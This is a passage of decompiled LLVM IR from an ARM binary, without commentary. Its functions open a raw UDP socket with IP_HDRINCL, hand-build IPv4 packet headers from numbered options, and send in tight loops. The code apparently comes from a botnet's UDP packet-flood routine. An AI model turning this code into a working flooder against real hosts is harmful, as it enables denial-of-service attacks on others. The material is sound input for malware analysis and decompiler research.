  %v0_e9cc = load i32, i32* %r5.global-to-local, align 4
  %v1_e9cc = add i32 %v0_e9cc, 24
  store i32 %v1_e9cc, i32* %r5.global-to-local, align 4
  br i1 %v9_e9c4, label %dec_label_pc_ea48.preheader, label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9a4, %dec_label_pc_e8a4
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_e8a4 ], [ %v1_e9c0, %dec_label_pc_e9a4 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_e8a4 ], [ %v1_e8f8, %dec_label_pc_e9a4 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e9e0 = call i32 @_calloc(i32 65535, i32 1)
  store i32 %v3_e810, i32* %r1.global-to-local, align 4
  %v2_e9f4 = load i32, i32* @sl, align 4
  %v3_e9f4 = add i32 %v2_e9f4, %stack_var_-60.0
  %v4_e9f4 = inttoptr i32 %v3_e9f4 to i32*
  store i32 %v2_e9e0, i32* %v4_e9f4, align 4
  br i1 %v3_e9f0, label %dec_label_pc_e9fc, label %dec_label_pc_e8e4

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e9d4
  %v0_e9fc = call i32 @function_117dc()
  %v1_e9fc = trunc i32 %v0_e9fc to i8
  %v4_ea00 = sdiv i32 %v0_e9fc, 256
  %v1_ea04 = trunc i32 %v4_ea00 to i8
  %v2_ea04 = load i32, i32* %r5.global-to-local, align 4
  %v3_ea04 = add i32 %v2_ea04, 3
  %v4_ea04 = inttoptr i32 %v3_ea04 to i8*
  store i8 %v1_ea04, i8* %v4_ea04, align 1
  %v3_ea08 = load i32, i32* %r5.global-to-local, align 4
  %v4_ea08 = add i32 %v3_ea08, 2
  %v5_ea08 = inttoptr i32 %v4_ea08 to i8*
  store i8 %v1_e9fc, i8* %v5_ea08, align 1
  br label %dec_label_pc_e8f0

dec_label_pc_ea10:                                ; preds = %dec_label_pc_ea48.loopexit, %dec_label_pc_ea48.preheader, %dec_label_pc_ea4c.loopexit, %dec_label_pc_ea10
  br label %dec_label_pc_ea10

dec_label_pc_ea14:                                ; preds = %dec_label_pc_ea14.lr.ph, %dec_label_pc_ea4c.loopexit
  %v0_ea14 = load i32, i32* @r8, align 4
  %v2_ea14 = icmp eq i32 %v0_ea14, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_ea14, label %dec_label_pc_ea1c, label %dec_label_pc_ea5c

dec_label_pc_ea1c:                                ; preds = %dec_label_pc_ea14
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ea24

dec_label_pc_ea24:                                ; preds = %dec_label_pc_ea24, %dec_label_pc_ea1c
  %v0_ea2c = phi i32 [ %v1_ea2c, %dec_label_pc_ea24 ], [ 0, %dec_label_pc_ea1c ]
  %v0_ea24 = phi i32 [ %v1_ea40, %dec_label_pc_ea24 ], [ 0, %dec_label_pc_ea1c ]
  %v1_ea24 = load i32, i32* @sb, align 4
  %v2_ea24 = add i32 %v1_ea24, %v0_ea24
  %v3_ea24 = inttoptr i32 %v2_ea24 to i32*
  %v4_ea24 = load i32, i32* %v3_ea24, align 4
  %v1_ea28 = load i32, i32* @sl, align 4
  %v2_ea28 = add i32 %v1_ea28, %v0_ea24
  %v3_ea28 = inttoptr i32 %v2_ea28 to i32*
  %v4_ea28 = load i32, i32* %v3_ea28, align 4
  store i32 %v4_ea28, i32* %r1.global-to-local, align 4
  %v1_ea2c = add i32 %v0_ea2c, 1
  store i32 %v1_ea2c, i32* %r5.global-to-local, align 4
  %v0_ea30 = load i32, i32* @r6, align 4
  %v4_ea38 = call i32 @_send(i32 %v4_ea24, i32 %v4_ea28, i32 %v0_ea30, i32 16384)
  %v1_ea3c = load i32, i32* @r7, align 4
  %v9_ea3c = icmp eq i32 %v1_ea2c, %v1_ea3c
  %v0_ea40 = load i32, i32* %r4.global-to-local, align 4
  %v1_ea40 = add i32 %v0_ea40, 4
  store i32 %v1_ea40, i32* %r4.global-to-local, align 4
  br i1 %v9_ea3c, label %dec_label_pc_ea48.loopexit, label %dec_label_pc_ea24

dec_label_pc_ea48.loopexit:                       ; preds = %dec_label_pc_ea24
  %tmp4247 = icmp slt i32 %v1_ea2c, 1
  br i1 %tmp4247, label %dec_label_pc_ea10, label %dec_label_pc_ea14.lr.ph

dec_label_pc_ea14.lr.ph:                          ; preds = %dec_label_pc_ea48.preheader, %dec_label_pc_ea48.loopexit
  br label %dec_label_pc_ea14

dec_label_pc_ea4c.loopexit:                       ; preds = %dec_label_pc_ea64
  %tmp42 = icmp slt i32 %v0_ea8c, 1
  br i1 %tmp42, label %dec_label_pc_ea10, label %dec_label_pc_ea14

dec_label_pc_ea54:                                ; preds = %dec_label_pc_e8f0
  store i32 %v3_e7b8, i32* %r4.global-to-local, align 4
  store i32 %v6_e7b8, i32* %r5.global-to-local, align 4
  store i32 %v24_e7b8, i32* %fp.global-to-local, align 4
  ret i32 %v3_e908

dec_label_pc_ea5c:                                ; preds = %dec_label_pc_ea14
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_ea64

dec_label_pc_ea64:                                ; preds = %dec_label_pc_ea64, %dec_label_pc_ea5c
  %v0_ea64 = phi i32 [ %v1_ea90, %dec_label_pc_ea64 ], [ 0, %dec_label_pc_ea5c ]
  %v1_ea64 = load i32, i32* @sl, align 4
  %v2_ea64 = add i32 %v1_ea64, %v0_ea64
  %v3_ea64 = inttoptr i32 %v2_ea64 to i32*
  %v4_ea64 = load i32, i32* %v3_ea64, align 4
  store i32 %v4_ea64, i32* @r4, align 4
  %v0_ea68 = load i32, i32* @r6, align 4
  store i32 %v0_ea68, i32* @r1, align 4
  %v1_ea70 = inttoptr i32 %v4_ea64 to i8*
  %v2_ea70 = call i32 @function_119b8(i8* %v1_ea70)
  %v0_ea74 = load i32, i32* @r5, align 4
  %v1_ea74 = add i32 %v0_ea74, 1
  store i32 %v1_ea74, i32* @r5, align 4
  %v0_ea78 = load i32, i32* @fp, align 4
  %v1_ea78 = load i32, i32* @sb, align 4
  %v2_ea78 = add i32 %v1_ea78, %v0_ea78
  %v3_ea78 = inttoptr i32 %v2_ea78 to i32*
  %v4_ea78 = load i32, i32* %v3_ea78, align 4
  %v0_ea7c = load i32, i32* @r4, align 4
  store i32 %v0_ea7c, i32* %r1.global-to-local, align 4
  %v0_ea80 = load i32, i32* @r6, align 4
  %v4_ea88 = call i32 @_send(i32 %v4_ea78, i32 %v0_ea7c, i32 %v0_ea80, i32 16384)
  %v0_ea8c = load i32, i32* @r5, align 4
  %v1_ea8c = load i32, i32* @r7, align 4
  %v9_ea8c = icmp eq i32 %v0_ea8c, %v1_ea8c
  %v0_ea90 = load i32, i32* @fp, align 4
  %v1_ea90 = add i32 %v0_ea90, 4
  store i32 %v1_ea90, i32* @fp, align 4
  br i1 %v9_ea8c, label %dec_label_pc_ea4c.loopexit, label %dec_label_pc_ea64

; uselistorder directives
  uselistorder i32 %v1_ea90, { 1, 0 }
  uselistorder i32 %v0_ea8c, { 1, 0 }
  uselistorder i32 %v1_ea40, { 1, 0 }
  uselistorder i32 %v1_ea2c, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 4, 1, 3 }
  uselistorder i32 %v0_e9b0, { 1, 0 }
  uselistorder i32 %v8_e980, { 1, 2, 0 }
  uselistorder i32 %v3_e958, { 1, 2, 0, 3 }
  uselistorder i32 %v3_e908, { 1, 3, 2, 0 }
  uselistorder i32 %v1_e8f8, { 1, 2, 0 }
  uselistorder i32 %v3_e860, { 0, 2, 1 }
  uselistorder i32 %v3_e810, { 0, 2, 1 }
  uselistorder i32 %v1_e7bc, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_ea14.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ea14, { 1, 0 }
  uselistorder label %dec_label_pc_ea10, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_e9a4, { 1, 0 }
  uselistorder label %dec_label_pc_e89c, { 1, 0 }
}

define i32 @function_eaa0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_eaa0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_eaa0 = load i32, i32* @r4, align 4
  %v6_eaa0 = load i32, i32* @r5, align 4
  %v9_eaa0 = load i32, i32* @r6, align 4
  %v12_eaa0 = load i32, i32* @r7, align 4
  %v18_eaa0 = load i32, i32* @sb, align 4
  %v24_eaa0 = load i32, i32* @fp, align 4
  %v1_eaa4 = urem i32 %arg1, 256
  store i32 %v1_eaa4, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_eaa4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_eabc = urem i32 %arg3, 256
  store i32 %v1_eabc, i32* @r4, align 4
  %v2_eac0 = call i32 @_calloc(i32 %v1_eaa4, i32 4)
  %v0_eac4 = load i32, i32* @r5, align 4
  store i32 %v0_eac4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ead4 = load i32, i32* @r4, align 4
  store i32 %v0_ead4, i32* %r0.global-to-local, align 4
  %v5_ead8 = inttoptr i32 %v0_eac4 to i32*
  %v6_ead8 = call i32 @function_b240(i32 %v0_ead4, i32* %v5_ead8, i32 2, i32 0)
  %v1_eae4 = urem i32 %v6_ead8, 256
  store i32 %v1_eae4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_eaf0 = load i32, i32* @r5, align 4
  store i32 %v0_eaf0, i32* %r1.global-to-local, align 4
  %v0_eaf4 = load i32, i32* @r4, align 4
  store i32 %v0_eaf4, i32* %r0.global-to-local, align 4
  %v5_eaf8 = trunc i32 %v6_ead8 to i8
  %v6_eafc = inttoptr i32 %v0_eaf0 to i32*
  %v7_eafc = call i32 @function_b240(i32 %v0_eaf4, i32* %v6_eafc, i32 3, i32 65535)
  %v0_eb00 = load i32, i32* @r5, align 4
  store i32 %v0_eb00, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_eafc, i32* %fp.global-to-local, align 4
  %v0_eb10 = load i32, i32* @r4, align 4
  store i32 %v0_eb10, i32* %r0.global-to-local, align 4
  %v4_eb14 = inttoptr i32 %v0_eb00 to i32*
  %v5_eb14 = call i32 @function_b240(i32 %v0_eb10, i32* %v4_eb14, i32 4, i32 64)
  %v1_eb1c = urem i32 %v5_eb14, 256
  store i32 %v1_eb1c, i32* %ip.global-to-local, align 4
  %v0_eb20 = load i32, i32* @r5, align 4
  store i32 %v0_eb20, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_eb2c = load i32, i32* @r4, align 4
  store i32 %v0_eb2c, i32* %r0.global-to-local, align 4
  %v5_eb30 = trunc i32 %v5_eb14 to i8
  %v6_eb34 = inttoptr i32 %v0_eb20 to i32*
  %v7_eb34 = call i32 @function_b240(i32 %v0_eb2c, i32* %v6_eb34, i32 5, i32 0)
  %v1_eb40 = urem i32 %v7_eb34, 256
  store i32 %v1_eb40, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_eb4c = load i32, i32* @r5, align 4
  store i32 %v0_eb4c, i32* %r1.global-to-local, align 4
  %v0_eb50 = load i32, i32* @r4, align 4
  store i32 %v0_eb50, i32* %r0.global-to-local, align 4
  %v5_eb58 = inttoptr i32 %v0_eb4c to i32*
  %v6_eb58 = call i32 @function_b240(i32 %v0_eb50, i32* %v5_eb58, i32 6, i32 65535)
  %v0_eb60 = load i32, i32* @r5, align 4
  store i32 %v0_eb60, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_eb58, i32* @r7, align 4
  %v0_eb70 = load i32, i32* @r4, align 4
  store i32 %v0_eb70, i32* %r0.global-to-local, align 4
  %v4_eb74 = inttoptr i32 %v0_eb60 to i32*
  %v5_eb74 = call i32 @function_b240(i32 %v0_eb70, i32* %v4_eb74, i32 7, i32 65535)
  %v0_eb78 = load i32, i32* @r5, align 4
  store i32 %v0_eb78, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_eb74, i32* %sb.global-to-local, align 4
  %v0_eb88 = load i32, i32* @r4, align 4
  store i32 %v0_eb88, i32* %r0.global-to-local, align 4
  %v4_eb8c = inttoptr i32 %v0_eb78 to i32*
  %v5_eb8c = call i32 @function_b240(i32 %v0_eb88, i32* %v4_eb8c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_eb98 = load i32, i32* @r5, align 4
  store i32 %v0_eb98, i32* %r1.global-to-local, align 4
  store i32 %v5_eb8c, i32* @r6, align 4
  %v0_eba0 = load i32, i32* @r4, align 4
  store i32 %v0_eba0, i32* %r0.global-to-local, align 4
  %v4_eba4 = inttoptr i32 %v0_eb98 to i32*
  %v5_eba4 = call i32 @function_b240(i32 %v0_eba0, i32* %v4_eba4, i32 1, i32 1)
  %v2_ebb0 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_ebb0, i32* %r3.global-to-local, align 4
  %v1_ebb4 = urem i32 %v5_eba4, 256
  store i32 %v1_ebb4, i32* %ip.global-to-local, align 4
  %v0_ebb8 = load i32, i32* @r5, align 4
  store i32 %v0_ebb8, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_ebc0 = load i32, i32* @r4, align 4
  store i32 %v0_ebc0, i32* %r0.global-to-local, align 4
  %v5_ebc8 = inttoptr i32 %v0_ebb8 to i32*
  %v6_ebc8 = call i32 @function_b240(i32 %v0_ebc0, i32* %v5_ebc8, i32 25, i32 %v2_ebb0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_ebdc = call i32 @_socket(i32 2, i32 3, i32 17)
  store i32 %v3_ebdc, i32* %r0.global-to-local, align 4
  %v7_ebe0 = icmp eq i32 %v3_ebdc, -1
  store i1 %v7_ebe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebe0, label %dec_label_pc_f008, label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %dec_label_pc_eaa0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_ebf4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_ebf4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ec08 = call i32 @_setsockopt(i32 %v3_ebdc, i32 0, i32 3, i32 %v6_ebf4, i32 4)
  store i32 %v5_ec08, i32* %r0.global-to-local, align 4
  %v7_ec0c = icmp eq i32 %v5_ec08, -1
  store i1 %v7_ec0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec0c, label %dec_label_pc_f000, label %dec_label_pc_ec14

dec_label_pc_ec14:                                ; preds = %dec_label_pc_ebec
  %v0_ec14 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ec20 = urem i32 %v0_ec14, 65536
  store i32 %v3_ec20, i32* %r2.global-to-local, align 4
  %v3_ec24 = icmp ugt i32 %v3_ec20, 1459
  %v9_ec24 = icmp eq i32 %v3_ec20, 1460
  store i1 %v9_ec24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ec24, label %bb, label %bb70

bb:                                               ; preds = %dec_label_pc_ec14
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_ec14, %bb
  %v0_ec2c = phi i32 [ %v3_ec20, %dec_label_pc_ec14 ], [ 1460, %bb ]
  %v0_ec30 = load i32, i32* @r7, align 4
  %v3_ec30 = mul i32 %v0_ec30, 65536
  store i32 %v3_ec30, i32* %r7.global-to-local, align 4
  %v3_ec34 = urem i32 %v0_ec30, 65536
  store i32 %v3_ec34, i32* %r3.global-to-local, align 4
  %v0_ec38 = load i32, i32* @sl, align 4
  %v2_ec38 = icmp eq i32 %v0_ec38, 0
  store i1 %v2_ec38, i1* %cpsr_z.global-to-local, align 1
  %v0_ec3c = load i32, i32* %fp.global-to-local, align 4
  %v3_ec3c = mul i32 %v0_ec3c, 65536
  store i32 %v3_ec3c, i32* %r0.global-to-local, align 4
  %v0_ec40 = load i32, i32* %sb.global-to-local, align 4
  %v3_ec40 = mul i32 %v0_ec40, 65536
  store i32 %v3_ec40, i32* %r5.global-to-local, align 4
  %tmp71 = icmp slt i32 %v0_ec38, 1
  br i1 %tmp71, label %bb72, label %bb73

bb72:                                             ; preds = %bb70
  store i32 %v0_ec2c, i32* %r3.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb70, %bb72
  %v5_ec68 = phi i32 [ %v3_ec34, %bb70 ], [ %v0_ec2c, %bb72 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ec50 = urem i32 %v0_ec3c, 65536
  store i32 %v3_ec50, i32* %r2.global-to-local, align 4
  %v3_ec54 = urem i32 %v0_ec40, 65536
  store i32 %v3_ec54, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp71, label %.thread, label %dec_label_pc_ec70

.thread:                                          ; preds = %bb73
  %v6_ec64 = add nsw i32 %v5_ec68, 28
  store i32 %v6_ec64, i32* @fp, align 4
  %v6_ec68 = add nsw i32 %v5_ec68, 8
  store i32 %v6_ec68, i32* @sb, align 4
  br label %dec_label_pc_ede4

dec_label_pc_ec70:                                ; preds = %bb73
  %v1_ec74 = add nuw nsw i32 %v0_ec2c, 28
  store i32 %v1_ec74, i32* @fp, align 4
  %tmp74 = mul nuw nsw i32 %v1_ec74, 256
  %v1_ec80 = and i32 %tmp74, 65280
  %tmp75 = udiv i32 %v0_ec3c, 256
  %v3_ec84 = urem i32 %tmp75, 256
  %v2_ec98 = icmp eq i32 %v1_eb40, 0
  store i1 %v2_ec98, i1* %cpsr_z.global-to-local, align 1
  %v1_ec9c = urem i32 %v0_ec3c, 256
  %v1_eca4 = add nuw nsw i32 %v0_ec2c, 8
  store i32 %v1_eca4, i32* @sb, align 4
  %v3_eca8 = mul i32 %v1_eca4, 65536
  store i32 %v3_eca8, i32* %r6.global-to-local, align 4
  %v1_ecac = urem i32 %v0_ec30, 256
  %v1_ecb0 = urem i32 %v0_ec40, 256
  store i32 %v1_ecb0, i32* %ip.global-to-local, align 4
  store i32 %v1_ec80, i32* %r3.global-to-local, align 4
  %tmp76 = mul nuw nsw i32 %v1_eca4, 256
  %v4_ecbc = mul nuw nsw i32 %v1_ec9c, 256
  %v5_ecbc = or i32 %v4_ecbc, %v3_ec84
  store i32 %v5_ecbc, i32* %r0.global-to-local, align 4
  %v3_ecc0 = mul nuw nsw i32 %v1_ecac, 256
  store i32 %v3_ecc0, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_ec40, 256
  %v3_ecc4 = urem i32 %tmp77, 256
  %v1_ecc8 = and i32 %tmp76, 65280
  store i32 %v1_ecc8, i32* %r1.global-to-local, align 4
  %tmp78 = udiv i32 %v1_ec74, 256
  %tmp79 = udiv i32 %v0_ec30, 256
  %v4_ecd0 = urem i32 %tmp79, 256
  %v5_ecd0 = or i32 %v4_ecd0, %v3_ecc0
  store i32 %v5_ecd0, i32* %r4.global-to-local, align 4
  %v5_ecd4 = trunc i32 %tmp78 to i8
  %v5_ecd8 = trunc i32 %tmp75 to i8
  %v4_ecdc = mul nuw nsw i32 %v1_ecb0, 256
  %v5_ecdc = or i32 %v4_ecdc, %v3_ecc4
  store i32 %v5_ecdc, i32* %r5.global-to-local, align 4
  %tmp80 = udiv i32 %v1_eca4, 256
  %v4_ece0 = urem i32 %tmp80, 256
  %v5_ece0 = or i32 %v4_ece0, %v1_ecc8
  store i32 %v5_ece0, i32* %r7.global-to-local, align 4
  br i1 %v2_ec98, label %dec_label_pc_ece8, label %dec_label_pc_f010

dec_label_pc_ece8:                                ; preds = %dec_label_pc_ec70
  %v3_ece835 = udiv i32 %v1_ec80, 256
  store i32 %v3_ece835, i32* %ip.global-to-local, align 4
  store i32 %v1_ec9c, i32* %r0.global-to-local, align 4
  store i32 %v1_ecac, i32* %r1.global-to-local, align 4
  store i32 %v1_ecb0, i32* %r2.global-to-local, align 4
  %v3_ecf836 = udiv i32 %v1_ecc8, 256
  store i32 %v3_ecf836, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_ed5c = sext i8 %v5_eaf8 to i32
  %v4_ed9c = sext i8 %v5_ecd8 to i32
  %sext14 = mul i32 %v0_ec3c, 16777216
  %v4_eda0 = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %v0_ec30, 16777216
  %v4_edb8 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v1_eca4, 16777216
  %v4_edbc = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v0_ec40, 16777216
  %v4_edc0 = sdiv i32 %sext17, 16777216
  %v1_eda8 = trunc i32 %v1_ec74 to i8
  %v1_edc8 = trunc i32 %v4_edbc to i8
  br label %dec_label_pc_ed14

dec_label_pc_ed14:                                ; preds = %dec_label_pc_ed14, %dec_label_pc_ece8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ed20 = call i32 @_calloc(i32 1510, i32 1)
  store i32 %v2_ed20, i32* %r0.global-to-local, align 4
  store i32 %v2_eac0, i32* %ip.global-to-local, align 4
  %v3_ed28 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ed28, i32* %r2.global-to-local, align 4
  %v2_ed2c = load i32, i32* %r6.global-to-local, align 4
  %v5_ed2c = mul i32 %v2_ed2c, 4
  %v6_ed2c = add i32 %v5_ed2c, %v2_eac0
  %v7_ed2c = inttoptr i32 %v6_ed2c to i32*
  store i32 %v2_ed20, i32* %v7_ed2c, align 4
  %v0_ed30 = load i32, i32* %ip.global-to-local, align 4
  %v1_ed30 = load i32, i32* %r2.global-to-local, align 4
  %v4_ed30 = mul i32 %v1_ed30, 4
  %v5_ed30 = add i32 %v4_ed30, %v0_ed30
  %v6_ed30 = inttoptr i32 %v5_ed30 to i32*
  %v7_ed30 = load i32, i32* %v6_ed30, align 4
  store i32 %v7_ed30, i32* %r1.global-to-local, align 4
  %v1_ed34 = inttoptr i32 %v7_ed30 to i8*
  %v2_ed34 = load i8, i8* %v1_ed34, align 1
  %tmp = urem i8 %v2_ed34, 16
  %v1_ed38 = zext i8 %tmp to i32
  %v1_ed3c = or i32 %v1_ed38, 64
  store i32 %v1_ed3c, i32* %r3.global-to-local, align 4
  %v1_ed40 = trunc i32 %v1_ed3c to i8
  store i8 %v1_ed40, i8* %v1_ed34, align 1
  %v0_ed44 = load i32, i32* %r1.global-to-local, align 4
  %v1_ed44 = inttoptr i32 %v0_ed44 to i8*
  %v2_ed44 = load i8, i8* %v1_ed44, align 1
  %v3_ed44 = zext i8 %v2_ed44 to i32
  %v1_ed48 = and i32 %v3_ed44, 240
  %v1_ed4c = or i32 %v1_ed48, 5
  store i32 %v1_ed4c, i32* %r2.global-to-local, align 4
  %v3_ed54 = add i32 %v0_ed44, 9
  %v4_ed54 = inttoptr i32 %v3_ed54 to i8*
  store i8 17, i8* %v4_ed54, align 1
  %v0_ed58 = load i32, i32* %r2.global-to-local, align 4
  %v1_ed58 = trunc i32 %v0_ed58 to i8
  %v2_ed58 = load i32, i32* %r1.global-to-local, align 4
  %v3_ed58 = inttoptr i32 %v2_ed58 to i8*
  store i8 %v1_ed58, i8* %v3_ed58, align 1
  store i32 %v4_ed5c, i32* %r0.global-to-local, align 4
  %v2_ed60 = load i32, i32* %r1.global-to-local, align 4
  %v3_ed60 = add i32 %v2_ed60, 1
  %v4_ed60 = inttoptr i32 %v3_ed60 to i8*
  store i8 %v5_eaf8, i8* %v4_ed60, align 1
  %v2_ed68 = load i32, i32* %r1.global-to-local, align 4
  %v3_ed68 = add i32 %v2_ed68, 8
  %v4_ed68 = inttoptr i32 %v3_ed68 to i8*
  store i8 %v5_eb30, i8* %v4_ed68, align 1
  %v3_ed6c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ed6c, i32* %r2.global-to-local, align 4
  store i32 %v6_ebc8, i32* %ip.global-to-local, align 4
  %v3_ed74 = mul i32 %v3_ed6c, 32
  store i32 %v3_ed74, i32* %r3.global-to-local, align 4
  %v1_ed78 = load i32, i32* %r1.global-to-local, align 4
  %v2_ed78 = add i32 %v1_ed78, 12
  %v3_ed78 = inttoptr i32 %v2_ed78 to i32*
  store i32 %v6_ebc8, i32* %v3_ed78, align 4
  %v0_ed7c = load i32, i32* %r3.global-to-local, align 4
  %v1_ed7c = load i32, i32* %r2.global-to-local, align 4
  %tmp82 = mul i32 %v1_ed7c, -8
  %v5_ed7c = add i32 %v0_ed7c, %tmp82
  %v1_ed80 = load i32, i32* @r8, align 4
  %v2_ed80 = add i32 %v5_ed7c, %v1_ed80
  store i32 %v2_ed80, i32* %r3.global-to-local, align 4
  %v1_ed84 = add i32 %v2_ed80, 16
  %v2_ed84 = inttoptr i32 %v1_ed84 to i32*
  %v3_ed84 = load i32, i32* %v2_ed84, align 4
  %v1_ed88 = load i32, i32* %r1.global-to-local, align 4
  %v2_ed88 = add i32 %v1_ed88, 16
  %v3_ed88 = inttoptr i32 %v2_ed88 to i32*
  store i32 %v3_ed84, i32* %v3_ed88, align 4
  %v0_ed90 = load i32, i32* %r2.global-to-local, align 4
  %v1_ed90 = add i32 %v0_ed90, 1
  store i32 %v1_ed90, i32* %r6.global-to-local, align 4
  %v2_ed94 = load i32, i32* %r1.global-to-local, align 4
  %v3_ed94 = add i32 %v2_ed94, 2
  %v4_ed94 = inttoptr i32 %v3_ed94 to i8*
  store i8 %v5_ecd4, i8* %v4_ed94, align 1
  store i32 %v4_ed9c, i32* %ip.global-to-local, align 4
  store i32 %v4_eda0, i32* %r0.global-to-local, align 4
  %v0_eda4 = load i32, i32* %r1.global-to-local, align 4
  %v1_eda4 = add i32 %v0_eda4, 20
  store i32 %v1_eda4, i32* %r3.global-to-local, align 4
  %v3_eda8 = add i32 %v0_eda4, 3
  %v4_eda8 = inttoptr i32 %v3_eda8 to i8*
  store i8 %v1_eda8, i8* %v4_eda8, align 1
  %v0_edac = load i32, i32* %ip.global-to-local, align 4
  %v1_edac = trunc i32 %v0_edac to i8
  %v2_edac = load i32, i32* %r1.global-to-local, align 4
  %v3_edac = add i32 %v2_edac, 4
  %v4_edac = inttoptr i32 %v3_edac to i8*
  store i8 %v1_edac, i8* %v4_edac, align 1
  %v0_edb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_edb0 = trunc i32 %v0_edb0 to i8
  %v2_edb0 = load i32, i32* %r1.global-to-local, align 4
  %v3_edb0 = add i32 %v2_edb0, 5
  %v4_edb0 = inttoptr i32 %v3_edb0 to i8*
  store i8 %v1_edb0, i8* %v4_edb0, align 1
  %v0_edb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_edb4 = trunc i32 %v0_edb4 to i8
  %v2_edb4 = load i32, i32* %r1.global-to-local, align 4
  %v3_edb4 = add i32 %v2_edb4, 20
  %v4_edb4 = inttoptr i32 %v3_edb4 to i8*
  store i8 %v1_edb4, i8* %v4_edb4, align 1
  store i32 %v4_edb8, i32* %r2.global-to-local, align 4
  store i32 %v4_edbc, i32* %r1.global-to-local, align 4
  store i32 %v4_edc0, i32* %ip.global-to-local, align 4
  %v0_edc4 = load i32, i32* %r6.global-to-local, align 4
  %v1_edc4 = load i32, i32* @sl, align 4
  %v9_edc4 = icmp eq i32 %v0_edc4, %v1_edc4
  store i1 %v9_edc4, i1* %cpsr_z.global-to-local, align 1
  %v2_edc8 = load i32, i32* %r3.global-to-local, align 4
  %v3_edc8 = add i32 %v2_edc8, 5
  %v4_edc8 = inttoptr i32 %v3_edc8 to i8*
  store i8 %v1_edc8, i8* %v4_edc8, align 1
  %v0_edcc = load i32, i32* %r2.global-to-local, align 4
  %v1_edcc = trunc i32 %v0_edcc to i8
